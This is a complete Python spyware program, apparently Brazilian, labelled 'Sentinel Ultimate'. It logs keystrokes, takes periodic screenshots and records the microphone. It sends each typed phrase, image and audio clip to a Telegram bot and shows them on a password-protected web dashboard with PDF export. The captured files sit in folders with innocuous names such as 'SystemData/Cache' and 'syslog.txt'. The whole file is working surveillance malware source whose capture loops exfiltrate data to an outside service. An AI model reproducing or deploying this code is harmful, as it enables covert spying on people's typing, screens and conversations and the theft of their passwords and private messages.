#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
SENTINEL ULTIMATE - VERSÃO COM PDF FUNCIONAL

Configuração via arquivo .env (NÃO commitar no GitHub):
  BOT_TOKEN  = seu_token_telegram
  CHAT_ID    = seu_chat_id
  SENTINEL_USER  = admin
  SENTINEL_SENHA = sua_senha

Instale python-dotenv:
  pip install python-dotenv
"""

import os
import threading
import time
import requests
import pyautogui
import sounddevice as sd
import soundfile as sf
from pynput import keyboard
from datetime import datetime
import numpy as np
import webbrowser
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.parse
from io import BytesIO

# ============================================
# CARREGAR .env SE EXISTIR
# ============================================
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # sem dotenv, usa variáveis de ambiente do sistema

# ============================================
# CONFIGURAÇÕES - via variáveis de ambiente
# ============================================
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
CHAT_ID   = os.environ.get('CHAT_ID', '')
USUARIO   = os.environ.get('SENTINEL_USER', 'admin')
SENHA     = os.environ.get('SENTINEL_SENHA', '')

# Alertas de configuração ausente
if not BOT_TOKEN:
    print("⚠️  BOT_TOKEN não definido — notificações Telegram desativadas")
if not CHAT_ID:
    print("⚠️  CHAT_ID não definido — notificações Telegram desativadas")
if not SENHA:
    print("⚠️  SENTINEL_SENHA não definida — acesso ao painel bloqueado")

# Pastas locais
DATA_DIR       = "SystemData"
LOG_DIR        = os.path.join(DATA_DIR, "Logs")
SCREENSHOT_DIR = os.path.join(DATA_DIR, "Cache")
AUDIO_DIR      = os.path.join(DATA_DIR, "Temp")
KEYLOG_PATH    = os.path.join(LOG_DIR, "syslog.txt")

for pasta in [DATA_DIR, LOG_DIR, SCREENSHOT_DIR, AUDIO_DIR]:
    os.makedirs(pasta, exist_ok=True)

# Variáveis de estado
monitor_ativo    = True
tempo_screenshot = 5
tempo_audio      = 10
ultima_screenshot = None
ultimo_audio     = None
ultimas_frases   = []
buffer_teclas    = ""
ultimo_tempo     = time.time()
logado           = False

estatisticas = {
    'screenshots': 0,
    'audios': 0,
    'teclas': 0,
    'palavras': 0,
    'start_time': time.time()
}

# ============================================
# TELEGRAM
# ============================================

def _telegram_ok():
    return bool(BOT_TOKEN and CHAT_ID)

def enviar_mensagem_telegram(texto):
    if not _telegram_ok():
        return False
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": texto}, timeout=5)
        return True
    except:
        return False

def enviar_arquivo_telegram(caminho, legenda):
    if not _telegram_ok():
        return False
    try:
        with open(caminho, "rb") as f:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            requests.post(url, data={"chat_id": CHAT_ID, "caption": legenda},
                          files={"document": f}, timeout=10)
        return True
    except:
        return False

def testar_telegram():
    print("📡 Testando Telegram...")
    if not _telegram_ok():
        print("⚠️  Telegram não configurado (BOT_TOKEN/CHAT_ID ausentes)")
        return
    if enviar_mensagem_telegram("🛡️ SENTINEL INICIADO!"):
        print("✅ Telegram CONECTADO!")
    else:
        print("❌ Telegram NÃO conectado — verifique BOT_TOKEN e CHAT_ID")

# ============================================
# PDF
# ============================================

def gerar_pdf():
    try:
        from reportlab.lib.pagesizes import A4
        from reportlab.pdfgen import canvas
        from reportlab.lib.utils import ImageReader
        from reportlab.lib.colors import Color

        buffer = BytesIO()
        pdf = canvas.Canvas(buffer, pagesize=A4)
        width, height = A4

        pdf.setFont("Helvetica-Bold", 24)
        pdf.setFillColor(Color(0, 0.8, 0.8))
        pdf.drawString(50, height - 50, "SENTINEL ULTIMATE")

        pdf.setFont("Helvetica", 10)
        pdf.setFillColor(Color(0.5, 0.5, 0.5))
        pdf.drawString(50, height - 75, f"Relatório gerado em: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
        pdf.line(50, height - 85, width - 50, height - 85)

        pdf.setFont("Helvetica-Bold", 16)
        pdf.setFillColor(Color(0, 0.8, 0.8))
        pdf.drawString(50, height - 120, "ESTATÍSTICAS")

        pdf.setFont("Helvetica", 12)
        pdf.setFillColor(Color(0.1, 0.1, 0.1))
        y = height - 150
        for linha in [
            f"Screenshots capturadas: {estatisticas['screenshots']}",
            f"Áudios gravados: {estatisticas['audios']}",
            f"Caracteres digitados: {estatisticas['teclas']}",
            f"Palavras digitadas: {estatisticas['palavras']}",
        ]:
            pdf.drawString(50, y, linha)
            y -= 20

        uptime = int(time.time() - estatisticas['start_time'])
        h, m, s = uptime // 3600, (uptime % 3600) // 60, uptime % 60
        pdf.drawString(50, y, f"Tempo de monitoramento: {h}h {m}m {s}s")
        y -= 30

        pdf.line(50, y, width - 50, y)
        y -= 30

        pdf.setFont("Helvetica-Bold", 16)
        pdf.setFillColor(Color(0, 0.8, 0.8))
        pdf.drawString(50, y, "PALAVRAS DIGITADAS")
        y -= 20

        pdf.setFont("Helvetica", 9)
        pdf.setFillColor(Color(0.1, 0.1, 0.1))
        if os.path.exists(KEYLOG_PATH):
            with open(KEYLOG_PATH, 'r', encoding='utf-8') as f:
                linhas = f.readlines()[-50:]
            for linha in reversed(linhas):
                if y < 50:
                    pdf.showPage()
                    y = height - 50
                linha_limpa = linha.strip()[:90]
                if linha_limpa:
                    pdf.drawString(50, y, linha_limpa)
                    y -= 14

        if ultima_screenshot and os.path.exists(ultima_screenshot):
            pdf.showPage()
            pdf.setFont("Helvetica-Bold", 16)
            pdf.setFillColor(Color(0, 0.8, 0.8))
            pdf.drawString(50, height - 50, "ÚLTIMA SCREENSHOT")
            try:
                img = ImageReader(ultima_screenshot)
                x_pos = (width - 500) / 2
                pdf.drawImage(img, x_pos, height - 450, width=500, height=350,
                              preserveAspectRatio=True)
                ts = datetime.fromtimestamp(os.path.getctime(ultima_screenshot))
                pdf.setFont("Helvetica", 10)
                pdf.setFillColor(Color(0.4, 0.4, 0.4))
                pdf.drawString(50, height - 470, f"Capturada em: {ts.strftime('%d/%m/%Y %H:%M:%S')}")
            except:
                pdf.drawString(50, height - 100, "Erro ao carregar imagem")

        pdf.save()
        buffer.seek(0)
        return buffer.getvalue()
    except Exception as e:
        return f"Erro ao gerar PDF: {str(e)}".encode()

# ============================================
# KEYLOGGER
# ============================================

def processar_tecla(tecla):
    global buffer_teclas, ultimas_frases, estatisticas, ultimo_tempo, monitor_ativo
    if not monitor_ativo:
        return
    try:
        if hasattr(tecla, 'char') and tecla.char:
            c = tecla.char
            if c.isalnum() or c in [' ', '.', ',', '!', '?']:
                buffer_teclas += c
                ultimo_tempo = time.time()
        else:
            nome = str(tecla).replace('Key.', '')
            if nome == 'space':
                buffer_teclas += ' '
                ultimo_tempo = time.time()
            elif nome == 'enter':
                if buffer_teclas.strip():
                    registrar_frase(buffer_teclas.strip())
                buffer_teclas = ""
            elif nome == 'backspace':
                buffer_teclas = buffer_teclas[:-1]

        if time.time() - ultimo_tempo > 2 and buffer_teclas.strip():
            registrar_frase(buffer_teclas.strip())
            buffer_teclas = ""
    except:
        pass

def registrar_frase(frase):
    global ultimas_frases, estatisticas
    if not frase.strip():
        return
    registro = f"[{datetime.now().strftime('%H:%M:%S')}] {frase}"
    with open(KEYLOG_PATH, "a", encoding="utf-8") as f:
        f.write(registro + "\n")
    ultimas_frases.append(registro)
    if len(ultimas_frases) > 100:
        ultimas_frases.pop(0)
    estatisticas['teclas'] += len(frase)
    estatisticas['palavras'] += 1
    enviar_mensagem_telegram(f"⌨️ {frase}")

def iniciar_keylogger():
    with keyboard.Listener(on_press=processar_tecla) as listener:
        listener.join()

# ============================================
# CAPTURAS
# ============================================

def capturar_screenshot():
    global ultima_screenshot, estatisticas, monitor_ativo
    if not monitor_ativo:
        return None
    try:
        nome = f"scr_{int(time.time())}.png"
        caminho = os.path.join(SCREENSHOT_DIR, nome)
        pyautogui.screenshot(caminho)
        ultima_screenshot = caminho
        estatisticas['screenshots'] += 1
        enviar_arquivo_telegram(caminho, "📸")
        return caminho
    except:
        return None

def capturar_audio():
    global ultimo_audio, estatisticas, monitor_ativo
    if not monitor_ativo:
        return None
    try:
        nome = f"aud_{int(time.time())}.wav"
        caminho = os.path.join(AUDIO_DIR, nome)
        fs = 44100
        gravacao = sd.rec(int(5 * fs), samplerate=fs, channels=2, dtype='float32')
        sd.wait()
        gravacao = np.clip(gravacao * 5.0, -1.0, 1.0)
        sf.write(caminho, gravacao, fs)
        ultimo_audio = caminho
        estatisticas['audios'] += 1
        enviar_arquivo_telegram(caminho, "🎤")
        return caminho
    except:
        return None

def loop_captura():
    while True:
        if monitor_ativo:
            capturar_screenshot()
        time.sleep(tempo_screenshot)

def loop_audio():
    while True:
        if monitor_ativo:
            capturar_audio()
        time.sleep(tempo_audio)

# ============================================
# SERVIDOR WEB
# ============================================

class Handler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        global logado, ultima_screenshot, ultimo_audio, estatisticas, monitor_ativo

        if self.path.startswith('/screenshot'):
            if ultima_screenshot and os.path.exists(ultima_screenshot):
                with open(ultima_screenshot, 'rb') as f:
                    data = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.send_header('Cache-Control', 'no-cache')
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(404); self.end_headers()
            return

        if self.path.startswith('/audio'):
            if ultimo_audio and os.path.exists(ultimo_audio):
                with open(ultimo_audio, 'rb') as f:
                    data = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'audio/wav')
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(404); self.end_headers()
            return

        if self.path == '/keylog':
            teclas = []
            if os.path.exists(KEYLOG_PATH):
                with open(KEYLOG_PATH, 'r', encoding='utf-8') as f:
                    teclas = f.readlines()[-50:]
            self._json({'teclas': teclas})
            return

        if self.path == '/stats':
            self._json({
                'screenshots': estatisticas['screenshots'],
                'audios': estatisticas['audios'],
                'teclas': estatisticas['teclas'],
                'palavras': estatisticas['palavras'],
                'monitorando': monitor_ativo
            })
            return

        if self.path == '/export_pdf':
            pdf_data = gerar_pdf()
            nome = f'sentinel_{datetime.now().strftime("%Y%m%d_%H%M%S")}.pdf'
            self.send_response(200)
            self.send_header('Content-type', 'application/pdf')
            self.send_header('Content-Disposition', f'attachment; filename={nome}')
            self.end_headers()
            self.wfile.write(pdf_data if isinstance(pdf_data, bytes) else pdf_data.encode())
            return

        if self.path == '/logout':
            logado = False
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
            return

        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = LOGIN_HTML if not logado else DASHBOARD_HTML
            self.wfile.write(html.encode('utf-8'))
            return

        self.send_response(404); self.end_headers()

    def do_POST(self):
        global logado, estatisticas, ultimas_frases, buffer_teclas, monitor_ativo

        if self.path == '/login':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length).decode()
            params = urllib.parse.parse_qs(data)
            u = params.get('usuario', [''])[0]
            s = params.get('senha', [''])[0]
            if u == USUARIO and s == SENHA and SENHA:
                logado = True
                self._json({'success': True})
            else:
                self._json({'success': False})
            return

        if self.path == '/start':
            monitor_ativo = True
            estatisticas['start_time'] = time.time()
            enviar_mensagem_telegram("▶️ Monitoramento INICIADO!")
            self._ok(); return

        if self.path == '/stop':
            monitor_ativo = False
            enviar_mensagem_telegram("⏸️ Monitoramento PAUSADO!")
            self._ok(); return

        if self.path == '/capturar':
            threading.Thread(target=capturar_screenshot, daemon=True).start()
            self._ok(); return

        if self.path == '/audio_cmd':
            threading.Thread(target=capturar_audio, daemon=True).start()
            self._ok(); return

        if self.path == '/clear_teclas':
            ultimas_frases = []
            estatisticas['teclas'] = 0
            estatisticas['palavras'] = 0
            buffer_teclas = ""
            if os.path.exists(KEYLOG_PATH):
                open(KEYLOG_PATH, 'w').close()
            self._ok(); return

        if self.path == '/clear_all':
            ultimas_frases = []
            estatisticas.update({'screenshots':0,'audios':0,'teclas':0,'palavras':0,'start_time':time.time()})
            buffer_teclas = ""
            for folder in [SCREENSHOT_DIR, AUDIO_DIR]:
                for fname in os.listdir(folder):
                    try: os.remove(os.path.join(folder, fname))
                    except: pass
            if os.path.exists(KEYLOG_PATH):
                open(KEYLOG_PATH, 'w').close()
            self._ok(); return

        self.send_response(404); self.end_headers()

    def _json(self, obj):
        data = json.dumps(obj).encode()
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(data)

    def _ok(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b'OK')

# ============================================
# HTML
# ============================================

LOGIN_HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><title>Sentinel - Login</title>
    <style>
        body{background:linear-gradient(135deg,#0a0a2a,#1a1a3a);font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
        .card{background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);border-radius:30px;padding:40px;width:380px;text-align:center}
        h1{color:#00ffcc;margin-bottom:20px}
        input{width:100%;padding:14px;margin:10px 0;background:rgba(0,0,0,0.5);border:1px solid #00ffcc;border-radius:15px;color:white;box-sizing:border-box}
        button{width:100%;padding:14px;background:linear-gradient(45deg,#00ffcc,#00ccff);border:none;border-radius:15px;font-weight:bold;cursor:pointer;font-size:16px}
        #error{color:red;margin-top:15px;display:none}
    </style>
</head>
<body>
<div class="card">
    <h1>🛡️ Sentinel Ultimate</h1>
    <input type="text" id="usuario" placeholder="Usuário">
    <input type="password" id="senha" placeholder="Senha">
    <button onclick="login()">🔓 ACESSAR</button>
    <div id="error">Usuário ou senha incorretos</div>
</div>
<script>
async function login(){
    const res = await fetch('/login',{
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:`usuario=${encodeURIComponent(document.getElementById('usuario').value)}&senha=${encodeURIComponent(document.getElementById('senha').value)}`
    });
    const d = await res.json();
    if(d.success) location.href='/';
    else document.getElementById('error').style.display='block';
}
document.addEventListener('keydown', e => { if(e.key==='Enter') login(); });
</script>
</body>
</html>'''

DASHBOARD_HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><title>Sentinel - Dashboard</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;font-family:Arial;padding:20px}
        .navbar{background:rgba(0,0,0,0.8);padding:15px;border-radius:15px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px}
        .logo{font-size:22px;font-weight:bold;color:#00ffcc}
        .led{width:12px;height:12px;background:#0f0;border-radius:50%;display:inline-block;animation:pulse 1s infinite}
        @keyframes pulse{0%,100%{opacity:.5}50%{opacity:1}}
        .btn{background:#00ffcc;border:none;padding:8px 16px;border-radius:25px;cursor:pointer;margin:3px;font-weight:bold;font-size:13px}
        .btn-stop{background:#ff4444;color:white}
        .btn-start{background:#00cc66;color:white}
        .btn-pdf{background:#ff6600;color:white}
        .btn-clear{background:#ffaa44;color:#333}
        .grid{display:flex;gap:20px;margin-bottom:20px;flex-wrap:wrap}
        .card{background:rgba(255,255,255,0.1);border-radius:20px;padding:20px;flex:1;min-width:280px}
        .card-header{border-bottom:2px solid #00ffcc;margin-bottom:15px;padding-bottom:8px;font-weight:bold;color:#00ffcc}
        img{width:100%;border-radius:10px;max-height:200px;object-fit:contain;background:#000}
        audio{width:100%;margin-top:10px}
        .stats{display:flex;gap:10px;flex-wrap:wrap}
        .stat-box{text-align:center;background:rgba(0,0,0,0.4);padding:12px;border-radius:12px;flex:1;min-width:80px}
        .stat-number{font-size:26px;font-weight:bold;color:#00ffcc}
        .keylog-area{background:rgba(0,0,0,0.5);border-radius:10px;padding:12px;height:280px;overflow-y:auto;font-family:monospace;font-size:12px}
        .keylog-line{padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.08)}
    </style>
</head>
<body>
<div class="navbar">
    <div class="logo">🛡️ Sentinel Ultimate</div>
    <div style="display:flex;align-items:center;gap:8px">
        <div class="led"></div>
        <span id="statusText">Monitorando</span>
        <span id="clock" style="color:#aaa;font-size:13px"></span>
    </div>
    <div>
        <button class="btn btn-start" onclick="iniciar()">▶️ Iniciar</button>
        <button class="btn btn-stop" onclick="parar()">⏸️ Parar</button>
        <button class="btn" onclick="capturar()">📸 Screen</button>
        <button class="btn" onclick="audio()">🎤 Áudio</button>
        <button class="btn btn-pdf" onclick="exportarPDF()">📄 PDF</button>
        <button class="btn btn-clear" onclick="limparTudo()">🗑️ Limpar</button>
        <button class="btn btn-stop" onclick="sair()">🚪 Sair</button>
    </div>
</div>
<div class="grid">
    <div class="card">
        <div class="card-header">📸 Screenshot</div>
        <img id="scr" onclick="abrirModal()" style="cursor:pointer" title="Clique para ampliar">
        <div id="scr_time" style="font-size:11px;color:#aaa;margin-top:5px"></div>
    </div>
    <div class="card">
        <div class="card-header">🎤 Áudio</div>
        <audio id="aud" controls></audio>
        <div id="aud_time" style="font-size:11px;color:#aaa;margin-top:5px"></div>
    </div>
    <div class="card">
        <div class="card-header">📊 Estatísticas</div>
        <div class="stats">
            <div class="stat-box"><div class="stat-number" id="s1">0</div><div style="font-size:11px">Screens</div></div>
            <div class="stat-box"><div class="stat-number" id="s2">0</div><div style="font-size:11px">Áudios</div></div>
            <div class="stat-box"><div class="stat-number" id="s3">0</div><div style="font-size:11px">Chars</div></div>
            <div class="stat-box"><div class="stat-number" id="s4">0</div><div style="font-size:11px">Palavras</div></div>
            <div class="stat-box"><div class="stat-number" id="uptime" style="font-size:18px">00:00</div><div style="font-size:11px">Tempo</div></div>
        </div>
        <div style="margin-top:12px">
            <button class="btn btn-clear" onclick="limparTeclas()" style="width:100%">⌨️ Limpar Teclas</button>
        </div>
    </div>
</div>
<div class="card">
    <div class="card-header">⌨️ Palavras Digitadas</div>
    <div class="keylog-area" id="keylog"></div>
</div>
<!-- Modal screenshot -->
<div id="modal" onclick="fecharModal()" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);z-index:999;justify-content:center;align-items:center">
    <span style="position:absolute;top:20px;right:40px;font-size:40px;cursor:pointer;color:#fff">&times;</span>
    <img id="modal-img" style="max-width:95%;max-height:90vh;border-radius:10px">
</div>
<script>
let startTime = Date.now();
function atualizar(){
    const ts = '?_=' + Date.now();
    document.getElementById('scr').src = '/screenshot' + ts;
    document.getElementById('scr_time').textContent = '📸 ' + new Date().toLocaleTimeString();
    const a = document.getElementById('aud');
    a.src = '/audio' + ts; a.load();
    document.getElementById('aud_time').textContent = '🎤 ' + new Date().toLocaleTimeString();
    fetch('/keylog').then(r=>r.json()).then(d=>{
        const div = document.getElementById('keylog');
        div.innerHTML = d.teclas.length
            ? d.teclas.map(l=>`<div class="keylog-line">💬 ${escHtml(l.trim())}</div>`).join('')
            : '<div class="keylog-line" style="color:#666">Aguardando digitação...</div>';
    });
    fetch('/stats').then(r=>r.json()).then(d=>{
        document.getElementById('s1').textContent = d.screenshots;
        document.getElementById('s2').textContent = d.audios;
        document.getElementById('s3').textContent = d.teclas;
        document.getElementById('s4').textContent = d.palavras;
        document.getElementById('statusText').innerHTML = d.monitorando ? '🟢 Monitorando' : '🔴 Parado';
    });
    const u = Math.floor((Date.now()-startTime)/1000);
    document.getElementById('uptime').textContent =
        `${Math.floor(u/3600).toString().padStart(2,'0')}:${Math.floor((u%3600)/60).toString().padStart(2,'0')}`;
    document.getElementById('clock').textContent = new Date().toLocaleTimeString();
}
function escHtml(t){const d=document.createElement('div');d.textContent=t;return d.innerHTML}
function iniciar(){fetch('/start',{method:'POST'}).then(()=>{startTime=Date.now();atualizar();})}
function parar(){fetch('/stop',{method:'POST'}).then(()=>atualizar())}
function capturar(){fetch('/capturar',{method:'POST'})}
function audio(){fetch('/audio_cmd',{method:'POST'})}
function exportarPDF(){window.open('/export_pdf')}
function sair(){window.location.href='/logout'}
function limparTeclas(){if(confirm('Limpar teclas?'))fetch('/clear_teclas',{method:'POST'}).then(()=>atualizar())}
function limparTudo(){if(confirm('⚠️ LIMPAR TUDO?'))fetch('/clear_all',{method:'POST'}).then(()=>{startTime=Date.now();atualizar();})}
function abrirModal(){const s=document.getElementById('scr').src;if(s){document.getElementById('modal-img').src=s;document.getElementById('modal').style.display='flex';}}
function fecharModal(){document.getElementById('modal').style.display='none';}
setInterval(atualizar, 3000);
atualizar();
</script>
</body>
</html>'''

# ============================================
# MAIN
# ============================================

def abrir_navegador():
    time.sleep(2)
    webbrowser.open("http://127.0.0.1:8080")

if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("🛡️  SENTINEL ULTIMATE")
    print("=" * 60)
    print(f"📱 Acesse : http://127.0.0.1:8080")
    print(f"👤 Usuário: {USUARIO}")
    print(f"📡 Telegram: {'✅ configurado' if _telegram_ok() else '❌ não configurado'}")
    print("=" * 60)

    try:
        import reportlab
        print("✅ ReportLab OK — PDF funcionando")
    except ImportError:
        print("⚠️  ReportLab não instalado: pip install reportlab")

    testar_telegram()

    threading.Thread(target=iniciar_keylogger, daemon=True).start()
    threading.Thread(target=loop_captura, daemon=True).start()
    threading.Thread(target=loop_audio, daemon=True).start()
    threading.Thread(target=abrir_navegador, daemon=True).start()

    server = HTTPServer(('0.0.0.0', 8080), Handler)
    print("✅ Servidor rodando em http://127.0.0.1:8080")
    print("🛑 Ctrl+C para encerrar\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n👋 Encerrando...")
        server.shutdown()
